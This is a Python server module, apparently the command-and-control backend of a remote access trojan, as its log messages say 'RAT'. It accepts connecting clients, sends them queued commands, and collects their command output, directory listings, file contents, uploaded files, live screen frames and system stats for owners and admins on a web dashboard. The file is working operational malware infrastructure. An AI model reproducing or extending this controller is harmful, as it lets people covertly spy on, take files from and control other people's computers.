import socket
import threading
import json
import base64
import os
import time
import queue
from datetime import datetime
from ..extensions import socketio
from ..services import client_manager
from ..config import BaseConfig
from ..utils.helpers import human_readable_size
from ..models import Client, ConnectCode
from werkzeug.security import check_password_hash
import logging


def reliable_send(sock, data_dict):
    try:
        payload = json.dumps(data_dict).encode('utf-8') + b'\n'
        sock.sendall(payload)
    except socket.error as e:
        print(f"[错误] 发送数据到客户端时发生Socket错误: {e}")
        raise


def send_thread(conn, q, client_id, stop_event):
    """专门用于从队列获取命令并发送给客户端的线程。"""
    while not stop_event.is_set():
        try:
            cmd = q.get(timeout=1)
            try:
                reliable_send(conn, cmd)
                print(f"Command sent to client {client_id}: {cmd}")
            except socket.error as e:
                print(f"[错误] 发送命令到客户端 {client_id} 失败: {e}")
                stop_event.set() # Signal other threads to stop
                break
        except queue.Empty:
            continue
    print(f"Send thread for client {client_id} finished.")

def receive_thread(conn, client_id, app, addr, stop_event):
    """专门用于接收客户端数据并处理的线程。"""
    buffer = b''
    while not stop_event.is_set():
        try:
            part = conn.recv(4096)
            if not part:
                print(f"Client {client_id} disconnected.")
                stop_event.set()
                break
            buffer += part
            while b'\n' in buffer:
                message, buffer = buffer.split(b'\n', 1)
                try:
                    data = json.loads(message.decode('utf-8'))
                    # Process data...
                    if data.get('status') == 'connected':
                        # 强制检查是否有 connection_code 参数 - 新握手协议
                        connection_code_raw = data.get('connection_code')
                        if not connection_code_raw:
                            reliable_send(conn, {'type': 'hello_ack', 'ok': False, 'error': 'missing_connection_code'})
                            stop_event.set()
                            break  # 中断连接

                        # 设备信息
                        device_fingerprint = data.get('device_fingerprint')
                        hardware_id = data.get('hardware_id')
                        mac_address = data.get('mac_address')
                        hostname = data.get('hostname')
                        os_type = data.get('os')
                        os_version = data.get('os_version')

                        # DB 操作
                        try:
                            from ..extensions import db
                            from ..models import Client, User, ConnectCode
                            with app.app_context():
                                # 校验连接码（在 app context 中）
                                code = None
                                for c in ConnectCode.query.filter_by(is_active=True).all():
                                    if check_password_hash(c.code_hash, connection_code_raw):
                                        code = c
                                        break
                                if not code:
                                    reliable_send(conn, {'type': 'hello_ack', 'ok': False, 'error': 'invalid_connection_code'})
                                    stop_event.set()
                                    break

                                # 根据设备指纹查找或创建客户端
                                client, created = Client.find_or_create_by_fingerprint(
                                    device_fingerprint,
                                    ip_address=addr[0],
                                    hardware_id=hardware_id,
                                    mac_address=mac_address,
                                    hostname=hostname,
                                    os_type=os_type,
                                    os_version=os_version,
                                )
                                if client is None:
                                    reliable_send(conn, {'type': 'hello_ack', 'ok': False, 'error': 'missing_device_fingerprint'})
                                    stop_event.set()
                                    break

                                # 绑定连接码与状态
                                client.connect_code_id = code.id
                                client.status = 'online'
                                client.last_seen = datetime.utcnow()

                                # 设置归属：用户码 → owner_id，游客码 → owner_id=None
                                if code.code_type == 'user':
                                    client.owner_id = code.user_id
                                else:  # guest
                                    client.owner_id = None

                                # 更新连接码使用时间
                                code.last_used_at = client.last_seen

                                db.session.add(client)
                                db.session.add(code)
                                db.session.commit()

                                # 发送握手确认
                                reliable_send(conn, {
                                    'type': 'hello_ack',
                                    'ok': True,
                                    'mode': code.code_type,  # 'user' or 'guest'
                                    'client_id': client.client_id
                                })

                                # 更新客户端管理器中的数据库 ID 映射
                                if client_id in client_manager.client_info:
                                    client_manager.client_info[client_id]['db_client_id'] = client.id
                                else:
                                    client_manager.client_info[client_id] = {'db_client_id': client.id}

                        except Exception as e:
                            print(f"数据库操作错误: {e}")
                            reliable_send(conn, {'type': 'hello_ack', 'ok': False, 'error': 'database_error'})
                            stop_event.set()
                            break

                        # 更新内存中的客户端信息
                        info = client_manager.client_info[client_id]
                        info['user'] = data.get('user', '未知')
                        info['initial_cwd'] = data.get('cwd', '未知')
                        info['os'] = data.get('os', '未知')
                        info['hostname'] = hostname or data.get('user', '未知')
                        
                        # 获取所有者ID
                        owner_id = client.owner_id
                        
                        # 准备事件数据
                        event_data = {'client_id': client_id, **info, 'owner_id': owner_id}

                        # 如果有所有者，则定向发送到该用户的房间
                        if owner_id:
                            socketio.emit('client_updated', event_data, room=owner_id)
                            logging.info(f"Emitted 'client_updated' for client {client_id} to owner {owner_id}.")
                        
                        # 始终向所有管理员发送更新
                        with app.app_context():
                            from ..models import User
                            admin_users = User.query.filter_by(is_admin=True).all()
                            for admin in admin_users:
                                if admin.id != owner_id: # 避免向所有者重复发送
                                    socketio.emit('client_updated', event_data, room=admin.id)
                                    logging.info(f"Emitted 'client_updated' for client {client_id} to admin {admin.id}.")

                        continue

                    if "file" in data and "data" in data:
                        filename = data["file"]
                        content = base64.b64decode(data["data"])
                        os.makedirs(BaseConfig.DOWNLOADS_DIR, exist_ok=True)
                        
                        # 获取客户端信息，使用hostname作为文件名前缀
                        client_prefix = client_id  # 默认使用client_id
                        
                        try:
                            with app.app_context():
                                db_client_id = client_manager.client_info.get(client_id, {}).get('db_client_id')
                                
                                if db_client_id:
                                    from ..models import Client
                                    client = Client.query.get(db_client_id)
                                    if client and client.hostname:
                                        # 清理hostname中的特殊字符，确保文件名安全
                                        safe_hostname = "".join(c for c in client.hostname if c.isalnum() or c in ('-', '_')).rstrip()
                                        if safe_hostname:  # 如果清理后不为空，使用hostname
                                            client_prefix = safe_hostname
                                        else:
                                            client_prefix = f"Client_{client_id}"
                                    else:
                                        client_prefix = f"Client_{client_id}"
                        except Exception as e:
                            print(f"[警告] 获取客户端hostname失败: {e}")
                            client_prefix = f"Client_{client_id}"
                        
                        unique_filename = f"{client_prefix}_{int(time.time())}_{os.path.basename(filename)}"
                        path = os.path.join(BaseConfig.DOWNLOADS_DIR, unique_filename)
                        with open(path, "wb") as f:
                            f.write(content)
                        socketio.emit('command_result', {'output': f"文件已保存: {unique_filename}"})

                    elif "output" in data:
                        print(f"[调试] 服务端收到客户端 {client_id} 的回复: {data['output'][:100]}...")  # 添加调试日志
                        logging.info(f"Received command result from client {client_id}: {data['output'][:100]}...")
                        
                        # 获取客户端的所有者ID
                        owner_id = None
                        with app.app_context():
                            db_client_id = client_manager.client_info.get(client_id, {}).get('db_client_id')
                            if db_client_id:
                                from ..models import Client
                                client = Client.query.get(db_client_id)
                                if client:
                                    owner_id = client.owner_id
                        
                        event_data = {'output': data['output'], 'target_id': client_id}
                        
                        # 定向发送给所有者
                        if owner_id:
                            socketio.emit('command_result', event_data, room=owner_id)
                            print(f"[调试] 已发送command_result事件给所有者 {owner_id}")
                            logging.debug(f"Emitted 'command_result' for client {client_id} to owner {owner_id}.")
                        else:
                            # 如果没有所有者（游客码客户端），广播给所有连接的用户
                            socketio.emit('command_result', event_data)
                            print(f"[调试] 已广播command_result事件（无所有者）")
                            logging.debug(f"Broadcasted 'command_result' for client {client_id} (no owner).")

                        # 广播给所有管理员
                        with app.app_context():
                            from ..models import User
                            admin_users = User.query.filter_by(is_admin=True).all()
                            for admin in admin_users:
                                if admin.id != owner_id:
                                    socketio.emit('command_result', event_data, room=admin.id)
                                    print(f"[调试] 已发送command_result事件给管理员 {admin.id}")
                                    logging.debug(f"Emitted 'command_result' for client {client_id} to admin {admin.id}.")

                        # 为了向后兼容或特定目的，保留一个发给特定客户端的事件
                        socketio.emit('batch_command_result', {'output': data['output'], 'client_id': client_id})
                        print(f"[调试] 已发送batch_command_result事件")

                    elif "dir_list" in data:
                        # 同样，需要确定所有者并定向发送
                        owner_id = None
                        with app.app_context():
                            db_client_id = client_manager.client_info.get(client_id, {}).get('db_client_id')
                            if db_client_id:
                                from ..models import Client
                                client = Client.query.get(db_client_id)
                                if client:
                                    owner_id = client.owner_id
                        
                        event_data = {'client_id': client_id, 'dir_list': data['dir_list']}
                        
                        if owner_id:
                            socketio.emit('dir_list', event_data, room=owner_id)
                            logging.debug(f"Emitted 'dir_list' for client {client_id} to owner {owner_id}.")
                            
                        with app.app_context():
                            from ..models import User
                            admin_users = User.query.filter_by(is_admin=True).all()
                            for admin in admin_users:
                                if admin.id != owner_id:
                                    socketio.emit('dir_list', event_data, room=admin.id)
                                    logging.debug(f"Emitted 'dir_list' for client {client_id} to admin {admin.id}.")

                    elif "file_text" in data:
                        owner_id = None
                        with app.app_context():
                            db_client_id = client_manager.client_info.get(client_id, {}).get('db_client_id')
                            if db_client_id:
                                from ..models import Client
                                client = Client.query.get(db_client_id)
                                if client:
                                    owner_id = client.owner_id
                                    
                        event_data = {
                            'client_id': client_id,
                            'path': data.get('path'),
                            'text': data.get('file_text'),
                            'is_base64': data.get('is_base64', False)
                        }
                        
                        if owner_id:
                            socketio.emit('file_text', event_data, room=owner_id)
                            logging.debug(f"Emitted 'file_text' for client {client_id} to owner {owner_id}.")

                        with app.app_context():
                            from ..models import User
                            admin_users = User.query.filter_by(is_admin=True).all()
                            for admin in admin_users:
                                if admin.id != owner_id:
                                    socketio.emit('file_text', event_data, room=admin.id)
                                    logging.debug(f"Emitted 'file_text' for client {client_id} to admin {admin.id}.")

                    elif data.get('type') == 'screen_frame':
                        # 转发客户端屏幕帧到前端（包含尺寸与虚拟屏参数，便于坐标映射）
                        socketio.emit('screen_frame_update', {
                            'client_id': client_id,
                            'data': data.get('data'),
                            'w': data.get('w'),
                            'h': data.get('h'),
                            'vx': data.get('vx'),
                            'vy': data.get('vy'),
                            'vw': data.get('vw'),
                            'vh': data.get('vh'),
                        })

                    elif data.get('type') == 'status_update':
                        # 转发状态更新到前端
                        owner_id = None
                        with app.app_context():
                            db_client_id = client_manager.client_info.get(client_id, {}).get('db_client_id')
                            if db_client_id:
                                from ..models import Client
                                client = Client.query.get(db_client_id)
                                if client:
                                    owner_id = client.owner_id

                        event_data = {
                            'client_id': client_id,
                            'cpu_percent': data.get('cpu_percent'),
                            'mem_percent': data.get('mem_percent')
                        }
                        
                        if owner_id:
                            socketio.emit('status_update', event_data, room=owner_id)
                            logging.debug(f"Emitted 'status_update' for client {client_id} to owner {owner_id}.")
                        
                        # 也发给所有管理员
                        with app.app_context():
                            from ..models import User
                            admin_users = User.query.filter_by(is_admin=True).all()
                            for admin in admin_users:
                                if admin.id != owner_id:
                                    socketio.emit('status_update', event_data, room=admin.id)
                                    logging.debug(f"Emitted 'status_update' for client {client_id} to admin {admin.id}.")
                except json.JSONDecodeError:
                    print(f"Could not decode JSON from client {client_id}")
                    continue
        except socket.error as e:
            print(f"[错误] 接收客户端 {client_id} 数据时发生错误: {e}")
            stop_event.set()
            break
    print(f"Receive thread for client {client_id} finished.")

def client_handler(conn, addr, client_id, app):
    logging.info(f"[THREAD START] Starting client_handler for {client_id} at {addr}.")
    q = client_manager.register_client(client_id, conn, addr)
    print(f"[+] RAT客户端已连接: {addr}, ID: {client_id}")
    
    # 立即发送包含初始信息的 new_client 事件
    initial_info = client_manager.client_info.get(client_id, {})
    socketio.emit('new_client', {
        'client_id': client_id,
        'addr': str(addr),
        'user': initial_info.get('user', '获取中...'),
        'initial_cwd': initial_info.get('initial_cwd', '获取中...'),
        'os': initial_info.get('os', '获取中...')
    })
    logging.info(f"Emitted 'new_client' for client {client_id} to all users.")

    # 为每个客户端连接创建独立的 stop_event
    stop_event = threading.Event()

    # 创建并启动发送和接收线程
    sender = threading.Thread(target=send_thread, args=(conn, q, client_id, stop_event))
    receiver = threading.Thread(target=receive_thread, args=(conn, client_id, app, addr, stop_event))
    
    sender.start()
    receiver.start()
    
    # 等待线程结束
    sender.join()
    receiver.join()

    # Cleanup
    db_client_id = client_manager.client_info.get(client_id, {}).get('db_client_id')
    owner_id = None
    client_db_id_for_event = None

    with app.app_context():
        if db_client_id:
            from ..models import Client
            client = Client.query.get(db_client_id)
            if client:
                client.status = 'offline'
                client.last_seen = datetime.utcnow()
                owner_id = client.owner_id
                client_db_id_for_event = client.id
                from ..extensions import db
                db.session.commit()

    # Only remove the client if the connection object is still the one this thread was responsible for.
    client_manager.remove_client_if_match(client_id, conn)
    logging.info(f"[THREAD END] Client handler for {client_id} finished.")
    print(f"[-] RAT客户端已断开: {addr}, ID: {client_id}")
    
    event_data = {'client_id': client_id, 'db_id': client_db_id_for_event}

    if owner_id:
        socketio.emit('client_disconnected', event_data, room=owner_id)
        logging.info(f"Emitted 'client_disconnected' for client {client_id} to owner {owner_id}.")

    with app.app_context():
        from ..models import User
        admin_users = User.query.filter_by(is_admin=True).all()
        for admin in admin_users:
            if admin.id != owner_id:
                socketio.emit('client_disconnected', event_data, room=admin.id)
                logging.info(f"Emitted 'client_disconnected' for client {client_id} to admin {admin.id}.")

def start_tcp_server(app):
    """启动TCP服务器"""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', BaseConfig.RAT_PORT))
    srv.listen(5)
    print(f"[*] RAT TCP监听 {BaseConfig.RAT_PORT}")
    cid = 0
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=client_handler, args=(conn, addr, str(cid), app), daemon=True).start()
        cid += 1
